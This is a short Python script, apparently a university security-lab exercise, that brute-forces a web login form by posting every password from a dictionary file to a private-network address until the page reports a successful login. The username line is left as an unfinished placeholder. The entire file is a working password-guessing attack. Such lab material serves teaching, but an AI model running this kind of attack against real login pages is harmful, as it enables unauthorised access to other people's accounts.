import requests




url = "http://172.16.48.80"


username = #Q1; ex: Alina’s username = V_Feliz203




with open("/home/cse/Lab4/Q2dictionary.txt", "r") as f:
    passwords = [line.strip() for line in f]




for password in passwords:
    data = {"username": username, "password": password, "submit": "submit"}
    response = requests.post(url, data=data)
    if response.status_code == 200 and "You Logged In" in response.text:
        print(f"Correct password found: {password}")
        break
